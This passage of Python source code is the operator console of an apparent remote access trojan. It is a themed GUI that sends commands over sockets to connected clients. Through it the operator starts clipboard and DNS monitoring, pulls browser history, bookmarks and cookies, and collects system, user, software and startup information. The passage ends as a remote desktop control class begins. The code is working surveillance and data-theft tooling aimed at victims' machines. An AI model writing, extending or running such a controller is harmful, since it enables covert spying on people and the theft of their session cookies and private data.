        self.get_dns_btn = ctk.CTkButton(buttons_frame, text="Get DNS History", 
                                        command=self.get_dns_history,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"])
        
        self.get_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_dns_btn)
        
        self.save_dns_btn = ctk.CTkButton(buttons_frame, text="Save DNS Data", 
                                         command=self.save_dns_data,
                                         state="disabled",
                                         fg_color=theme["button_color"],
                                         hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"])
        
        self.save_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_dns_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:")
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.dns_status_label = ctk.CTkLabel(status_frame, text="Idle")
        self.dns_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # DNS history display
        history_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        history_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        history_label = ctk.CTkLabel(history_frame, text="DNS Query History")
        history_label.pack(pady=5)
        
        # Create treeview for DNS history
        columns = ("Timestamp", "Query", "Type")
        self.dns_tree = ttk.Treeview(history_frame, columns=columns, show="headings", height=15, style='Custom.Treeview')
        
        # Define headings
        for col in columns:
            self.dns_tree.heading(col, text=col)
            if col == "Query":
                self.dns_tree.column(col, width=250)
            else:
                self.dns_tree.column(col, width=100)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(history_frame, orient=tk.VERTICAL, command=self.dns_tree.yview)
        self.dns_tree.configure(yscroll=scrollbar.set)
        
        # Pack components
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.dns_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Add filter
        filter_frame = ctk.CTkFrame(history_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filter_label = ctk.CTkLabel(filter_frame, text="Filter:")
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.dns_filter_entry = ctk.CTkEntry(filter_frame, fg_color=theme["input_bg"], 
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"],
                                    border_width=1)
    
        self.dns_filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.dns_filter_entry.bind("<KeyRelease>", self.filter_dns_history)
        
        # Store DNS data
        self.dns_history = []
    
    def setup_system_info_tab(self):
        """Setup the system information tab with consistent theme styling"""
        theme = self.get_theme_colors()
        
        # Create system info tab with theme-consistent styling
        self.sysinfo_frame = ctk.CTkFrame(
            self.adv_monitor_notebook, 
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Flat design for cyberpunk aesthetic
        )
        self.adv_monitor_notebook.add(self.sysinfo_frame, text="System Information")
        
        # Controls frame - distinctive card styling
        controls_frame = ctk.CTkFrame(
            self.sysinfo_frame, 
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=8
        )
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display - transparent background to contrast with controls frame
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=5, padx=10)
        
        # Label with accent color for "Connected Client:" text
        client_label = ctk.CTkLabel(
            client_frame, 
            text="Connected Client:",
            text_color=theme["accent_color"],  # Use accent color for important labels
            font=("Arial", 12, "bold")
        )
        client_label.pack(side=tk.LEFT, padx=5)
        
        # Client name with normal text color
        self.sysinfo_client_label = ctk.CTkLabel(
            client_frame, 
            text="None",
            text_color=theme["fg_color"]
        )
        self.sysinfo_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons frame
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=8, padx=10)
        
        # Get System Info button - use accent color for primary action
        self.get_sysinfo_btn = ctk.CTkButton(
            buttons_frame, 
            text="Get System Information", 
            command=self.get_system_info,
            fg_color=theme["accent_color"],
            hover_color=theme["hover_color"],
            text_color="#000000",  # Black text for better contrast on accent color
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=4  # Slightly rounded corners
        )
        self.get_sysinfo_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_sysinfo_btn)
        
        # Save Information button - use regular button color for secondary action
        self.save_sysinfo_btn = ctk.CTkButton(
            buttons_frame, 
            text="Save Information", 
            command=self.save_system_info,
            state="disabled",
            fg_color=theme["button_color"],
            hover_color=theme["hover_color"],
            text_color=theme["fg_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=4  # Slightly rounded corners
        )
        self.save_sysinfo_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_sysinfo_btn)
        
        # System info notebook - use custom style defined in ThemeManager
        sysinfo_notebook = ttk.Notebook(self.sysinfo_frame, style="Custom.TNotebook")
        sysinfo_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 5))
        
        # Store notebook for later access (for theme changes)
        self.sysinfo_notebook = sysinfo_notebook
        
        # Text display configuration function - reduces repetition
        def create_info_tab(parent, tab_title):
            # Create frame with card styling
            frame = ctk.CTkFrame(
                parent, 
                fg_color=theme["card_color"],
                border_width=1 if "border_color" in theme else 0,
                border_color=theme["border_color"] if "border_color" in theme else None,
                corner_radius=0  # Flat design for text containers
            )
            parent.add(frame, text=tab_title)
            
            # Create scrolled text with improved styling
            text_widget = scrolledtext.ScrolledText(
                frame, 
                wrap=tk.WORD, 
                background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                foreground=theme["fg_color"],
                insertbackground=theme["accent_color"],  # Cursor color
                selectbackground=theme["accent_color"],  # Selection highlight color
                selectforeground="#000000",  # Black text for contrast on selection
                font=("Consolas", 10),  # Monospaced font for system info
                borderwidth=0,
                highlightthickness=1,
                highlightcolor=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                highlightbackground=theme["card_color"],
                relief="flat"
            )
            text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            self.text_widgets.append(text_widget)
            return text_widget
        
        # Create consistent tabs using our helper function
        self.general_info_text = create_info_tab(sysinfo_notebook, "General")
        self.hardware_info_text = create_info_tab(sysinfo_notebook, "Hardware/Network")
        self.software_info_text = create_info_tab(sysinfo_notebook, "Software")
        self.users_info_text = create_info_tab(sysinfo_notebook, "Users")
        self.startup_info_text = create_info_tab(sysinfo_notebook, "Startup Items")
        
        # Add custom tag configurations for styling output text
        for text_widget in [self.general_info_text, self.hardware_info_text, 
                            self.software_info_text, self.users_info_text, 
                            self.startup_info_text]:
            # Add styling tags
            text_widget.tag_configure("header", foreground=theme["accent_color"], font=("Consolas", 11, "bold"))
            text_widget.tag_configure("subheader", foreground=theme["info_color"], font=("Consolas", 10, "bold"))
            text_widget.tag_configure("important", foreground=theme["warning_color"])
            text_widget.tag_configure("value", foreground=theme["fg_color"])
        
        # Store system info
        self.system_info = None
    
    # Network monitoring functions
    def update_client_info(self):
        """Update client info labels when a client is selected"""
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    client_info = f"{addr[0]}:{addr[1]}"
                    self.clipboard_client_label.configure(text=client_info)
                    self.browser_client_label.configure(text=client_info)
                    self.dns_client_label.configure(text=client_info)
                    self.sysinfo_client_label.configure(text=client_info)
                    self.analysis_client_label.configure(text=client_info)
                    return
        
        # No client selected
        self.clipboard_client_label.configure(text="None")
        self.browser_client_label.configure(text="None")
        self.dns_client_label.configure(text="None")
        self.sysinfo_client_label.configure(text="None")
    
    
    # Clipboard monitoring functions
    def start_clipboard_monitoring(self):
        """Start clipboard monitoring on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.current_client_socket.send("START_CLIPBOARD_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.clipboard_status_label.configure(text="Monitoring...")
                self.start_clipboard_btn.configure(state="disabled")
                self.stop_clipboard_btn.configure(state="normal")
                self.rat_app.log("Started clipboard monitoring on client")
            else:
                self.clipboard_status_label.configure(text="Error")
                self.rat_app.log(f"Error starting clipboard monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending clipboard monitoring command: {e}")
    
    def stop_clipboard_monitoring(self):
        """Stop clipboard monitoring on the client"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            self.rat_app.current_client_socket.send("STOP_CLIPBOARD_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.clipboard_status_label.configure(text="Stopped")
                self.start_clipboard_btn.configure(state="normal")
                self.stop_clipboard_btn.configure(state="disabled")
                self.rat_app.log("Stopped clipboard monitoring on client")
            else:
                self.rat_app.log(f"Error stopping clipboard monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending stop clipboard monitoring command: {e}")
    
    def get_clipboard_data(self):
        """Get clipboard data from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.clipboard_status_label.configure(text="Retrieving...")
            self.rat_app.log("Requesting clipboard data...")
            
            self.rat_app.current_client_socket.send("GET_CLIPBOARD_DATA".encode())
            
            # Get size of clipboard data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.clipboard_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No clipboard data available")
                self.clipboard_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            clipboard_data = json.loads(data.decode('utf-8'))
            
            # Display in text widget
            self.clipboard_data_text.delete(1.0, tk.END)
            
            if not clipboard_data:
                self.clipboard_data_text.insert(tk.END, "No clipboard history found")
            else:
                for item in clipboard_data:
                    timestamp = item.get('timestamp', 'Unknown')
                    value = item.get('value', '')
                    
                    self.clipboard_data_text.insert(tk.END, f"[{timestamp}]\n")
                    self.clipboard_data_text.insert(tk.END, f"{value}\n\n")
            
            self.clipboard_status_label.configure(text=f"Received {len(clipboard_data)} entries")
            self.rat_app.log(f"Received {len(clipboard_data)} clipboard entries")
            
        except Exception as e:
            self.rat_app.log(f"Error getting clipboard data: {e}")
            self.clipboard_status_label.configure(text="Error")
    
    def clear_clipboard_display(self):
        """Clear the clipboard display"""
        self.clipboard_data_text.delete(1.0, tk.END)
    
    # Browser data functions
    def extract_browser_data(self):
        """Extract browser data from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.browser_status_label.configure(text="Extracting...")
            self.rat_app.log("Requesting browser data...")
            
            self.rat_app.current_client_socket.send("EXTRACT_BROWSER_DATA".encode())
            
            # Get size of browser data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.browser_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No browser data available")
                self.browser_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.browser_data = json.loads(data.decode('utf-8'))
            
            # Display data based on selected browser and type
            self.display_browser_data()
            
            self.browser_status_label.configure(text="Data received")
            self.save_browser_btn.configure(state="normal")
            self.rat_app.log("Browser data received successfully")
            
        except Exception as e:
            self.rat_app.log(f"Error extracting browser data: {e}")
            self.browser_status_label.configure(text="Error")
    
    def display_browser_data(self):
        """Display browser data in the appropriate text widget"""
        if not self.browser_data:
            return
        
        browser = self.browser_var.get()
        data_type = self.datatype_var.get()
        
        # Clear text widgets
        self.chrome_data_text.delete(1.0, tk.END)
        self.firefox_data_text.delete(1.0, tk.END)
        self.edge_data_text.delete(1.0, tk.END)
        
        # Get data for each browser
        if 'chrome' in self.browser_data:
            self.display_browser_type_data(self.chrome_data_text, self.browser_data['chrome'].get(data_type, []))
        
        if 'firefox' in self.browser_data:
            self.display_browser_type_data(self.firefox_data_text, self.browser_data['firefox'].get(data_type, []))
        
        if 'edge' in self.browser_data:
            self.display_browser_type_data(self.edge_data_text, self.browser_data['edge'].get(data_type, []))
    
    def display_browser_type_data(self, text_widget, data):
        """Display specific browser data in the given text widget"""
        text_widget.delete(1.0, tk.END)
        
        if not data:
            text_widget.insert(tk.END, "No data available")
            return
        
        data_type = self.datatype_var.get()
        
        if data_type == 'history':
            # Format history entries
            text_widget.insert(tk.END, "BROWSING HISTORY\n\n")
            for item in data:
                timestamp = item.get('timestamp', 'Unknown')
                url = item.get('url', 'Unknown URL')
                title = item.get('title', 'Unknown Title')
                
                text_widget.insert(tk.END, f"[{timestamp}] {title}\n")
                text_widget.insert(tk.END, f"{url}\n\n")
                
        elif data_type == 'bookmarks':
            # Format bookmark entries
            text_widget.insert(tk.END, "BOOKMARKS\n\n")
            for item in data:
                name = item.get('name', 'Unknown Bookmark')
                url = item.get('url', 'Unknown URL')
                
                text_widget.insert(tk.END, f"{name}\n")
                text_widget.insert(tk.END, f"{url}\n\n")
                
        elif data_type == 'cookies':
            # Format cookie entries
            text_widget.insert(tk.END, "COOKIES\n\n")
            for item in data:
                domain = item.get('domain', 'Unknown Domain')
                name = item.get('name', 'Unknown Name')
                value = item.get('value', '')
                path = item.get('path', '/')
                
                text_widget.insert(tk.END, f"Domain: {domain}\n")
                text_widget.insert(tk.END, f"Name: {name}\n")
                text_widget.insert(tk.END, f"Value: {value}\n")
                text_widget.insert(tk.END, f"Path: {path}\n\n")
    
    def save_browser_data(self):
        """Save browser data to a file"""
        if not self.browser_data:
            messagebox.showinfo("No Data", "No browser data available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save Browser Data"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.browser_data, f, indent=4)
            
            self.rat_app.log(f"Browser data saved to {filename}")
            messagebox.showinfo("Save Complete", f"Browser data saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving browser data: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # DNS monitoring functions
    def start_dns_monitoring(self):
        """Start DNS monitoring on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.current_client_socket.send("START_DNS_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.dns_status_label.configure(text="Monitoring...")
                self.start_dns_btn.configure(state="disabled")
                self.stop_dns_btn.configure(state="normal")
                self.rat_app.log("Started DNS monitoring on client")
            else:
                self.dns_status_label.configure(text="Error")
                self.rat_app.log(f"Error starting DNS monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending DNS monitoring command: {e}")
    
    def stop_dns_monitoring(self):
        """Stop DNS monitoring on the client"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            self.rat_app.current_client_socket.send("STOP_DNS_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.dns_status_label.configure(text="Stopped")
                self.start_dns_btn.configure(state="normal")
                self.stop_dns_btn.configure(state="disabled")
                self.rat_app.log("Stopped DNS monitoring on client")
            else:
                self.rat_app.log(f"Error stopping DNS monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending stop DNS monitoring command: {e}")
    
    def get_dns_history(self):
        """Get DNS query history from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.dns_status_label.configure(text="Retrieving...")
            self.rat_app.log("Requesting DNS history...")
            
            self.rat_app.current_client_socket.send("GET_DNS_HISTORY".encode())
            
            # Get size of DNS history data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.dns_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No DNS history available")
                self.dns_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.dns_history = json.loads(data.decode('utf-8'))
            
            # Display in treeview
            self.update_dns_treeview()
            
            self.dns_status_label.configure(text=f"Received {len(self.dns_history)} entries")
            self.save_dns_btn.configure(state="normal")
            self.rat_app.log(f"Received {len(self.dns_history)} DNS entries")
            
        except Exception as e:
            self.rat_app.log(f"Error getting DNS history: {e}")
            self.dns_status_label.configure(text="Error")
    
    def update_dns_treeview(self):
        """Update the DNS treeview with history data"""
        # Clear existing items
        for item in self.dns_tree.get_children():
            self.dns_tree.delete(item)
        
        if not self.dns_history:
            return
        theme = self.get_theme_colors()
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                    background=theme["card_color"],
                    foreground=theme["fg_color"],
                    fieldbackground=theme["card_color"])
            # Get filter text
            
        filter_text = self.dns_filter_entry.get().lower()
        # Add DNS entries to treeview
        for entry in self.dns_history:
            timestamp = entry.get('timestamp', 'Unknown')
            query = entry.get('query', 'Unknown')
            query_type = entry.get('type', 'Unknown')
            
            # Apply filter if set
            if filter_text and filter_text not in query.lower():
                continue
            
            self.dns_tree.insert("", "end", values=(timestamp, query, query_type))
    
    def filter_dns_history(self, event=None):
        """Filter DNS history based on search text"""
        self.update_dns_treeview()
    
    def save_dns_data(self):
        """Save DNS history to a file"""
        if not self.dns_history:
            messagebox.showinfo("No Data", "No DNS history available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save DNS History"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.dns_history, f, indent=4)
            
            self.rat_app.log(f"DNS history saved to {filename}")
            messagebox.showinfo("Save Complete", f"DNS history saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving DNS history: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # System information functions
    def get_system_info(self):
        """Get system information from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.log("Requesting system information...")
            
            self.rat_app.current_client_socket.send("GET_SYSTEM_INFO".encode())
            
            # Get size of system info data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No system information available")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.system_info = json.loads(data.decode('utf-8'))
            
            # Display system information in text widgets
            self.display_system_info()
            
            self.save_sysinfo_btn.configure(state="normal")
            self.rat_app.log("System information received successfully")
            
        except Exception as e:
            self.rat_app.log(f"Error getting system information: {e}")
    
    def display_system_info(self):
        """Display system information in the appropriate text widgets"""
        if not self.system_info:
            return
        
        # Get theme colors for text formatting
        theme = self.get_theme_colors()
        
        # Configure text tags for formatting
        for text_widget in [self.general_info_text, self.hardware_info_text, 
                        self.software_info_text, self.users_info_text, 
                        self.startup_info_text]:
            text_widget.tag_configure("title", foreground=theme["accent_color"], font=("Arial", 12, "bold"))
            text_widget.tag_configure("header", foreground=theme["warning_color"], font=("Arial", 11, "bold"))
            text_widget.tag_configure("label", foreground=theme["fg_color"], font=("Arial", 10, "bold"))
            text_widget.tag_configure("value", foreground=theme["info_color"], font=("Arial", 10))
            text_widget.tag_configure("section", foreground=theme["success_color"], font=("Arial", 11, "bold"))
            text_widget.tag_configure("alert", foreground=theme["danger_color"], font=("Arial", 10, "bold"))
        
        # Format general system info
        self.general_info_text.delete(1.0, tk.END)
        self.general_info_text.insert(tk.END, "SYSTEM INFORMATION\n\n", "title")
        
        self.general_info_text.insert(tk.END, "Platform: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('platform', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "Platform Release: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('platform_release', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "Platform Version: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('platform_version', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "Architecture: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('architecture', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "Hostname: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('hostname', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "IP Address: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('ip_address', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "MAC Address: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('mac_address', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "Processor: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('processor', 'Unknown')}\n", "value")
        
        self.general_info_text.insert(tk.END, "RAM: ", "label")
        self.general_info_text.insert(tk.END, f"{self.system_info.get('ram', 'Unknown')}\n", "value")
        
        # Format hardware and network info
        self.hardware_info_text.delete(1.0, tk.END)
        self.hardware_info_text.insert(tk.END, "NETWORK INTERFACES\n\n", "title")
        
        for interface in self.system_info.get('network_interfaces', []):
            self.hardware_info_text.insert(tk.END, f"Interface: ", "header")
            self.hardware_info_text.insert(tk.END, f"{interface.get('interface', 'Unknown')}\n", "value")
            
            self.hardware_info_text.insert(tk.END, "IP Address: ", "label")
            self.hardware_info_text.insert(tk.END, f"{interface.get('ip', 'Unknown')}\n", "value")
            
            self.hardware_info_text.insert(tk.END, "Netmask: ", "label")
            self.hardware_info_text.insert(tk.END, f"{interface.get('netmask', 'Unknown')}\n", "value")
            
            if interface.get('broadcast'):
                self.hardware_info_text.insert(tk.END, "Broadcast: ", "label")
                self.hardware_info_text.insert(tk.END, f"{interface.get('broadcast')}\n", "value")
                
            self.hardware_info_text.insert(tk.END, "\n")
        
        # Format software info
        self.software_info_text.delete(1.0, tk.END)
        self.software_info_text.insert(tk.END, "INSTALLED SOFTWARE\n\n", "title")
        
        for software in self.system_info.get('installed_software', []):
            self.software_info_text.insert(tk.END, f"Name: ", "header")
            self.software_info_text.insert(tk.END, f"{software.get('name', 'Unknown')}\n", "value")
            
            self.software_info_text.insert(tk.END, "Version: ", "label")
            self.software_info_text.insert(tk.END, f"{software.get('version', 'Unknown')}\n", "value")
            
            self.software_info_text.insert(tk.END, "Publisher: ", "label")
            self.software_info_text.insert(tk.END, f"{software.get('publisher', 'Unknown')}\n", "value")
            
            self.software_info_text.insert(tk.END, "Install Date: ", "label")
            self.software_info_text.insert(tk.END, f"{software.get('install_date', 'Unknown')}\n\n", "value")
        
        # Format users info
        self.users_info_text.delete(1.0, tk.END)
        self.users_info_text.insert(tk.END, "SYSTEM USERS\n\n", "title")
        
        for user in self.system_info.get('users', []):
            self.users_info_text.insert(tk.END, f"Name: ", "header")
            self.users_info_text.insert(tk.END, f"{user.get('name', 'Unknown')}\n", "value")
            
            if 'uid' in user:
                self.users_info_text.insert(tk.END, "UID: ", "label")
                self.users_info_text.insert(tk.END, f"{user.get('uid')}\n", "value")
                
            if 'comment' in user:
                self.users_info_text.insert(tk.END, "Comment: ", "label")
                self.users_info_text.insert(tk.END, f"{user.get('comment')}\n", "value")
                
            if 'home' in user:
                self.users_info_text.insert(tk.END, "Home: ", "label")
                self.users_info_text.insert(tk.END, f"{user.get('home')}\n", "value")
                
            if 'shell' in user:
                self.users_info_text.insert(tk.END, "Shell: ", "label")
                self.users_info_text.insert(tk.END, f"{user.get('shell')}\n", "value")
                
            self.users_info_text.insert(tk.END, "\n")
        
        self.users_info_text.insert(tk.END, "LOGGED IN USERS\n\n", "section")
        
        for user in self.system_info.get('logged_in_users', []):
            self.users_info_text.insert(tk.END, f"Name: ", "header")
            self.users_info_text.insert(tk.END, f"{user.get('name', 'Unknown')}\n", "value")
            
            self.users_info_text.insert(tk.END, "Terminal: ", "label")
            self.users_info_text.insert(tk.END, f"{user.get('terminal', 'Unknown')}\n", "value")
            
            if user.get('host'):
                self.users_info_text.insert(tk.END, "Host: ", "label")
                self.users_info_text.insert(tk.END, f"{user.get('host')}\n", "value")
                
            self.users_info_text.insert(tk.END, "Started: ", "label")
            self.users_info_text.insert(tk.END, f"{user.get('started', 'Unknown')}\n\n", "value")
        
        # Format startup items
        self.startup_info_text.delete(1.0, tk.END)
        self.startup_info_text.insert(tk.END, "STARTUP ITEMS\n\n", "title")
        
        for item in self.system_info.get('startup_items', []):
            self.startup_info_text.insert(tk.END, f"Name: ", "header")
            self.startup_info_text.insert(tk.END, f"{item.get('name', 'Unknown')}\n", "value")
            
            self.startup_info_text.insert(tk.END, "Source: ", "label")
            self.startup_info_text.insert(tk.END, f"{item.get('source', 'Unknown')}\n", "value")
            
            self.startup_info_text.insert(tk.END, "Command: ", "label")
            self.startup_info_text.insert(tk.END, f"{item.get('command', 'Unknown')}\n\n", "value")
        
        # Also add services if available
        if self.system_info.get('running_services'):
            self.startup_info_text.insert(tk.END, "RUNNING SERVICES\n\n", "section")
            
            for service in self.system_info.get('running_services', []):
                self.startup_info_text.insert(tk.END, f"Name: ", "header")
                self.startup_info_text.insert(tk.END, f"{service.get('name', 'Unknown')}\n", "value")
                
                self.startup_info_text.insert(tk.END, "Display Name: ", "label")
                self.startup_info_text.insert(tk.END, f"{service.get('display_name', 'Unknown')}\n", "value")
                
                # Highlight the status with appropriate color
                status = service.get('status', 'Unknown')
                self.startup_info_text.insert(tk.END, "Status: ", "label")
                
                if status.lower() == 'running':
                    self.startup_info_text.insert(tk.END, f"{status}\n", "section")  # Green for running
                elif status.lower() == 'stopped':
                    self.startup_info_text.insert(tk.END, f"{status}\n", "alert")    # Red for stopped
                else:
                    self.startup_info_text.insert(tk.END, f"{status}\n", "value")    # Default for other states
                
                self.startup_info_text.insert(tk.END, "Start Type: ", "label")
                self.startup_info_text.insert(tk.END, f"{service.get('start_type', 'Unknown')}\n\n", "value")
    
    def save_system_info(self):
        """Save system information to a file"""
        if not self.system_info:
            messagebox.showinfo("No Data", "No system information available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save System Information"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.system_info, f, indent=4)
            
            self.rat_app.log(f"System information saved to {filename}")
            messagebox.showinfo("Save Complete", f"System information saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving system information: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # Utility functions
    def format_size(self, size_bytes):
        """Convert byte size to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"




class RemoteDesktopControl:
    """Interface for remote desktop control on server side with enhanced cyberpunk styling"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.is_controlling = False
        self.control_socket = None
        self.control_port = None
        self.last_pos = (0, 0)
        self.screen_width = 0
        self.screen_height = 0
        self.client_width = 0
        self.client_height = 0
        
        # Metrics tracking
        self.metrics_tracking = True
        self.start_time = time.time()
        self.frame_count = 0
        self.last_frame_time = time.time()
        self.fps_history = deque(maxlen=60)  # Store 60 FPS samples (1 minute at 1 sample/sec)
        self.latency_history = deque(maxlen=60)  # Store 60 latency samples
        self.bandwidth_history = deque(maxlen=60)  # Store 60 bandwidth samples
        self.last_metrics_update = time.time()
        self.last_frame_size = 0
        self.total_bytes_received = 0
        
        # Quality indicators
        self.connection_quality = "Unknown"
        self.connection_quality_level = 0  # 0-4 (Poor to Excellent)
        
        # Setup UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app"""
        theme_name = self.rat_app.current_theme
        return self.rat_app.THEMES[theme_name]
        
    def setup_ui(self):
